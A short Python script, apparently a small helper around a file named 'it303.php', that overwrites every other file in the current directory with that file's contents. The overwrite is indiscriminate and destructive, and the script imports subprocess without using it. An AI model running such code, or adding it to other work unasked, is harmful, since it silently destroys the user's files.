import subprocess as sub
import os
mainFile=open("it303.php", "r")
data=mainFile.read()

for file in os.listdir():
    if file != "it303.php" and file != "script.py":
        newFile=open(file, "w")
        newFile.write(data)
        newFile.close()

mainFile.close()
